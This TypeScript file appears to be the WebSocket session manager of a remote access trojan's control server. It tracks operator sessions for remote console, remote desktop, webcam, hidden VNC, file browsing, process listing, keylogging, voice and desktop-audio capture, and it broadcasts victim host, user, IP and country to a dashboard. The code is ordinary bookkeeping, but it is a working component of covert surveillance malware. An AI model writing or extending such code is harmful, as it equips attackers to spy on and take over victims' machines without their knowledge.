import type { ServerWebSocket } from "bun";
import type {
  ConsoleSession,
  RemoteDesktopViewer,
  FileBrowserViewer,
  ProcessViewer,
  VoiceViewer,
  DesktopAudioViewer,
  NotificationsViewer,
  KeyloggerViewer,
  ChatViewer,
  SocketData,
} from "./types";

export type DashboardViewer = {
  id: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
  userId?: number;
  userRole?: string;
};

const consoleSessions = new Map<string, ConsoleSession>();
const rdSessions = new Map<string, RemoteDesktopViewer>();
const webcamSessions = new Map<string, RemoteDesktopViewer>();
const hvncSessions = new Map<string, RemoteDesktopViewer>(); // HVNC uses same structure as RD
const consoleSessionsByClient = new Map<string, Set<string>>();
const rdSessionsByClient = new Map<string, Set<string>>();
const webcamSessionsByClient = new Map<string, Set<string>>();
const hvncSessionsByClient = new Map<string, Set<string>>();
const fileBrowserSessions = new Map<string, FileBrowserViewer>();
const processSessions = new Map<string, ProcessViewer>();
const fileBrowserSessionsByClient = new Map<string, Set<string>>();
const processSessionsByClient = new Map<string, Set<string>>();
const notificationSessions = new Map<string, NotificationsViewer>();
const keyloggerSessions = new Map<string, KeyloggerViewer>();
const keyloggerSessionsByClient = new Map<string, Set<string>>();
const voiceSessions = new Map<string, VoiceViewer>();
const voiceSessionsByClient = new Map<string, Set<string>>();
const desktopAudioSessions = new Map<string, DesktopAudioViewer>();
const desktopAudioSessionsByClient = new Map<string, Set<string>>();
const dashboardSessions = new Map<string, DashboardViewer>();
const chatSessions = new Map<string, ChatViewer>();

function addSessionToClientIndex(
  index: Map<string, Set<string>>,
  clientId: string,
  sessionId: string,
): void {
  let set = index.get(clientId);
  if (!set) {
    set = new Set<string>();
    index.set(clientId, set);
  }
  set.add(sessionId);
}

function removeSessionFromClientIndex(
  index: Map<string, Set<string>>,
  clientId: string,
  sessionId: string,
): void {
  const set = index.get(clientId);
  if (!set) return;
  set.delete(sessionId);
  if (set.size === 0) {
    index.delete(clientId);
  }
}

export function addConsoleSession(session: ConsoleSession): void {
  consoleSessions.set(session.id, session);
  addSessionToClientIndex(consoleSessionsByClient, session.clientId, session.id);
}

export function getConsoleSession(
  sessionId: string,
): ConsoleSession | undefined {
  return consoleSessions.get(sessionId);
}

export function deleteConsoleSession(sessionId: string): boolean {
  const existing = consoleSessions.get(sessionId);
  if (!existing) return false;
  consoleSessions.delete(sessionId);
  removeSessionFromClientIndex(consoleSessionsByClient, existing.clientId, sessionId);
  return true;
}

export function getConsoleSessionsByClient(clientId: string): ConsoleSession[] {
  const ids = consoleSessionsByClient.get(clientId);
  if (!ids || ids.size === 0) return [];
  const sessions: ConsoleSession[] = [];
  for (const id of ids) {
    const session = consoleSessions.get(id);
    if (session) sessions.push(session);
  }
  return sessions;
}

export function getAllConsoleSessions(): Map<string, ConsoleSession> {
  return consoleSessions;
}

export function addRdSession(session: RemoteDesktopViewer): void {
  rdSessions.set(session.id, session);
  addSessionToClientIndex(rdSessionsByClient, session.clientId, session.id);
}

export function addWebcamSession(session: RemoteDesktopViewer): void {
  webcamSessions.set(session.id, session);
  addSessionToClientIndex(webcamSessionsByClient, session.clientId, session.id);
}

export function getWebcamSession(
  sessionId: string,
): RemoteDesktopViewer | undefined {
  return webcamSessions.get(sessionId);
}

export function deleteWebcamSession(sessionId: string): boolean {
  const existing = webcamSessions.get(sessionId);
  if (!existing) return false;
  webcamSessions.delete(sessionId);
  removeSessionFromClientIndex(webcamSessionsByClient, existing.clientId, sessionId);
  return true;
}

export function getWebcamSessionsByClient(clientId: string): RemoteDesktopViewer[] {
  return getWebcamSessionsForClient(clientId);
}

export function getWebcamSessionsForClient(clientId: string): RemoteDesktopViewer[] {
  const ids = webcamSessionsByClient.get(clientId);
  if (!ids || ids.size === 0) return [];
  const sessions: RemoteDesktopViewer[] = [];
  for (const id of ids) {
    const session = webcamSessions.get(id);
    if (session) sessions.push(session);
  }
  return sessions;
}

export function hasWebcamSessionsForClient(clientId: string): boolean {
  const ids = webcamSessionsByClient.get(clientId);
  return Boolean(ids && ids.size > 0);
}

export function getAllWebcamSessions(): Map<string, RemoteDesktopViewer> {
  return webcamSessions;
}

export function getRdSession(
  sessionId: string,
): RemoteDesktopViewer | undefined {
  return rdSessions.get(sessionId);
}

export function deleteRdSession(sessionId: string): boolean {
  const existing = rdSessions.get(sessionId);
  if (!existing) return false;
  rdSessions.delete(sessionId);
  removeSessionFromClientIndex(rdSessionsByClient, existing.clientId, sessionId);
  return true;
}

export function getRdSessionsByClient(clientId: string): RemoteDesktopViewer[] {
  return getRdSessionsForClient(clientId);
}

export function getRdSessionsForClient(clientId: string): RemoteDesktopViewer[] {
  const ids = rdSessionsByClient.get(clientId);
  if (!ids || ids.size === 0) return [];
  const sessions: RemoteDesktopViewer[] = [];
  for (const id of ids) {
    const session = rdSessions.get(id);
    if (session) sessions.push(session);
  }
  return sessions;
}

export function hasRdSessionsForClient(clientId: string): boolean {
  const ids = rdSessionsByClient.get(clientId);
  return Boolean(ids && ids.size > 0);
}

export function getAllRdSessions(): Map<string, RemoteDesktopViewer> {
  return rdSessions;
}

// ==================== HVNC SESSION MANAGEMENT ====================

export function addHvncSession(session: RemoteDesktopViewer): void {
  hvncSessions.set(session.id, session);
  addSessionToClientIndex(hvncSessionsByClient, session.clientId, session.id);
}

export function getHvncSession(
  sessionId: string,
): RemoteDesktopViewer | undefined {
  return hvncSessions.get(sessionId);
}

export function deleteHvncSession(sessionId: string): boolean {
  const existing = hvncSessions.get(sessionId);
  if (!existing) return false;
  hvncSessions.delete(sessionId);
  removeSessionFromClientIndex(hvncSessionsByClient, existing.clientId, sessionId);
  return true;
}

export function getHvncSessionsByClient(clientId: string): RemoteDesktopViewer[] {
  return getHvncSessionsForClient(clientId);
}

export function getHvncSessionsForClient(clientId: string): RemoteDesktopViewer[] {
  const ids = hvncSessionsByClient.get(clientId);
  if (!ids || ids.size === 0) return [];
  const sessions: RemoteDesktopViewer[] = [];
  for (const id of ids) {
    const session = hvncSessions.get(id);
    if (session) sessions.push(session);
  }
  return sessions;
}

export function hasHvncSessionsForClient(clientId: string): boolean {
  const ids = hvncSessionsByClient.get(clientId);
  return Boolean(ids && ids.size > 0);
}

export function getAllHvncSessions(): Map<string, RemoteDesktopViewer> {
  return hvncSessions;
}

export function getHvncSessionCount(): number {
  return hvncSessions.size;
}

// ==================== FILE BROWSER SESSION MANAGEMENT ====================

export function addFileBrowserSession(session: FileBrowserViewer): void {
  fileBrowserSessions.set(session.id, session);
  addSessionToClientIndex(fileBrowserSessionsByClient, session.clientId, session.id);
}

export function getFileBrowserSession(
  sessionId: string,
): FileBrowserViewer | undefined {
  return fileBrowserSessions.get(sessionId);
}

export function deleteFileBrowserSession(sessionId: string): boolean {
  const existing = fileBrowserSessions.get(sessionId);
  if (!existing) return false;
  fileBrowserSessions.delete(sessionId);
  removeSessionFromClientIndex(fileBrowserSessionsByClient, existing.clientId, sessionId);
  return true;
}

export function getFileBrowserSessionsByClient(
  clientId: string,
): FileBrowserViewer[] {
  const ids = fileBrowserSessionsByClient.get(clientId);
  if (!ids || ids.size === 0) return [];
  const sessions: FileBrowserViewer[] = [];
  for (const id of ids) {
    const session = fileBrowserSessions.get(id);
    if (session) sessions.push(session);
  }
  return sessions;
}

export function getAllFileBrowserSessions(): Map<string, FileBrowserViewer> {
  return fileBrowserSessions;
}

export function addProcessSession(session: ProcessViewer): void {
  processSessions.set(session.id, session);
  addSessionToClientIndex(processSessionsByClient, session.clientId, session.id);
}

export function getProcessSession(
  sessionId: string,
): ProcessViewer | undefined {
  return processSessions.get(sessionId);
}

export function deleteProcessSession(sessionId: string): boolean {
  const existing = processSessions.get(sessionId);
  if (!existing) return false;
  processSessions.delete(sessionId);
  removeSessionFromClientIndex(processSessionsByClient, existing.clientId, sessionId);
  return true;
}

export function getProcessSessionsByClient(clientId: string): ProcessViewer[] {
  const ids = processSessionsByClient.get(clientId);
  if (!ids || ids.size === 0) return [];
  const sessions: ProcessViewer[] = [];
  for (const id of ids) {
    const session = processSessions.get(id);
    if (session) sessions.push(session);
  }
  return sessions;
}

export function getAllProcessSessions(): Map<string, ProcessViewer> {
  return processSessions;
}

export function addNotificationSession(session: NotificationsViewer): void {
  notificationSessions.set(session.id, session);
}

export function deleteNotificationSession(sessionId: string): boolean {
  return notificationSessions.delete(sessionId);
}

export function getAllNotificationSessions(): Map<string, NotificationsViewer> {
  return notificationSessions;
}

export function getConsoleSessionCount(): number {
  return consoleSessions.size;
}

export function getRdSessionCount(): number {
  return rdSessions.size;
}

export function getFileBrowserSessionCount(): number {
  return fileBrowserSessions.size;
}

export function getProcessSessionCount(): number {
  return processSessions.size;
}

export function getNotificationSessionCount(): number {
  return notificationSessions.size;
}

export function safeSendViewer(
  ws: ServerWebSocket<SocketData>,
  payload: any,
): boolean {
  try {
    ws.send(JSON.stringify(payload));
    return true;
  } catch (err) {
    return false;
  }
}

export function safeSendViewerFrame(
  ws: ServerWebSocket<SocketData>,
  bytes: Uint8Array,
  header?: any,
): number {
  try {
    const meta = JSON.stringify(header || {});
    const metaBytes = new TextEncoder().encode(meta);
    const metaLength = new Uint8Array(4);
    const view = new DataView(metaLength.buffer);
    view.setUint32(0, metaBytes.length, false);
    const buf = new Uint8Array(4 + metaBytes.length + bytes.length);
    buf.set(metaLength, 0);
    buf.set(metaBytes, 4);
    buf.set(bytes, 4 + metaBytes.length);
    ws.send(buf);
    return buf.length;
  } catch (err) {
    return 0;
  }
}

export function addKeyloggerSession(session: KeyloggerViewer): void {
  keyloggerSessions.set(session.id, session);
  addSessionToClientIndex(keyloggerSessionsByClient, session.clientId, session.id);
}

export function getKeyloggerSession(
  sessionId: string,
): KeyloggerViewer | undefined {
  return keyloggerSessions.get(sessionId);
}

export function deleteKeyloggerSession(sessionId: string): boolean {
  const existing = keyloggerSessions.get(sessionId);
  if (!existing) return false;
  keyloggerSessions.delete(sessionId);
  removeSessionFromClientIndex(keyloggerSessionsByClient, existing.clientId, sessionId);
  return true;
}

export function getKeyloggerSessionsByClient(
  clientId: string,
): KeyloggerViewer[] {
  const ids = keyloggerSessionsByClient.get(clientId);
  if (!ids || ids.size === 0) return [];
  const sessions: KeyloggerViewer[] = [];
  for (const id of ids) {
    const session = keyloggerSessions.get(id);
    if (session) sessions.push(session);
  }
  return sessions;
}

export function getAllKeyloggerSessions(): Map<string, KeyloggerViewer> {
  return keyloggerSessions;
}

export function addVoiceSession(session: VoiceViewer): void {
  voiceSessions.set(session.id, session);
  addSessionToClientIndex(voiceSessionsByClient, session.clientId, session.id);
}

export function getVoiceSession(sessionId: string): VoiceViewer | undefined {
  return voiceSessions.get(sessionId);
}

export function deleteVoiceSession(sessionId: string): boolean {
  const existing = voiceSessions.get(sessionId);
  if (!existing) return false;
  voiceSessions.delete(sessionId);
  removeSessionFromClientIndex(voiceSessionsByClient, existing.clientId, sessionId);
  return true;
}

export function getVoiceSessionsByClient(clientId: string): VoiceViewer[] {
  const ids = voiceSessionsByClient.get(clientId);
  if (!ids || ids.size === 0) return [];
  const sessions: VoiceViewer[] = [];
  for (const id of ids) {
    const session = voiceSessions.get(id);
    if (session) sessions.push(session);
  }
  return sessions;
}

export function getAllVoiceSessions(): Map<string, VoiceViewer> {
  return voiceSessions;
}

export function addDesktopAudioSession(session: DesktopAudioViewer): void {
  desktopAudioSessions.set(session.id, session);
  addSessionToClientIndex(desktopAudioSessionsByClient, session.clientId, session.id);
}

export function deleteDesktopAudioSession(sessionId: string): boolean {
  const existing = desktopAudioSessions.get(sessionId);
  if (!existing) return false;
  desktopAudioSessions.delete(sessionId);
  removeSessionFromClientIndex(desktopAudioSessionsByClient, existing.clientId, sessionId);
  return true;
}

export function getDesktopAudioSessionsByClient(clientId: string): DesktopAudioViewer[] {
  const ids = desktopAudioSessionsByClient.get(clientId);
  if (!ids || ids.size === 0) return [];
  const sessions: DesktopAudioViewer[] = [];
  for (const id of ids) {
    const session = desktopAudioSessions.get(id);
    if (session) sessions.push(session);
  }
  return sessions;
}

export function getAllDesktopAudioSessions(): Map<string, DesktopAudioViewer> {
  return desktopAudioSessions;
}

export function addDashboardSession(session: DashboardViewer): void {
  dashboardSessions.set(session.id, session);
}

export function deleteDashboardSession(sessionId: string): boolean {
  return dashboardSessions.delete(sessionId);
}

export function getAllDashboardSessions(): Map<string, DashboardViewer> {
  return dashboardSessions;
}

export function getDashboardSessionCount(): number {
  return dashboardSessions.size;
}

let dashboardBroadcastTimer: ReturnType<typeof setTimeout> | null = null;
const DASHBOARD_DEBOUNCE_MS = 150;

export function notifyDashboardClientEvent(
  event: "client_online" | "client_offline" | "client_purgatory",
  info: { id: string; host?: string; user?: string; os?: string; ip?: string; country?: string },
): void {
  const msg = JSON.stringify({
    type: "client_event",
    event,
    clientId: info.id,
    host: info.host,
    user: info.user,
    os: info.os,
    ip: info.ip,
    country: info.country,
    ts: Date.now(),
  });
  for (const [id, session] of dashboardSessions) {
    try {
      session.viewer.send(msg);
    } catch {
      dashboardSessions.delete(id);
    }
  }
}

export function notifyDashboardViewers(): void {
  if (dashboardBroadcastTimer) return;
  dashboardBroadcastTimer = setTimeout(() => {
    dashboardBroadcastTimer = null;
    const msg = JSON.stringify({ type: "clients_changed" });
    for (const [id, session] of dashboardSessions) {
      try {
        session.viewer.send(msg);
      } catch {
        dashboardSessions.delete(id);
      }
    }
  }, DASHBOARD_DEBOUNCE_MS);
}

export function addChatSession(session: ChatViewer): void {
  chatSessions.set(session.id, session);
}

export function deleteChatSession(sessionId: string): boolean {
  return chatSessions.delete(sessionId);
}

export function getAllChatSessions(): Map<string, ChatViewer> {
  return chatSessions;
}

export function getChatSessionCount(): number {
  return chatSessions.size;
}

export function broadcastChatMessage(msg: string): void {
  for (const [id, session] of chatSessions) {
    try {
      session.viewer.send(msg);
    } catch {
      chatSessions.delete(id);
    }
  }
}
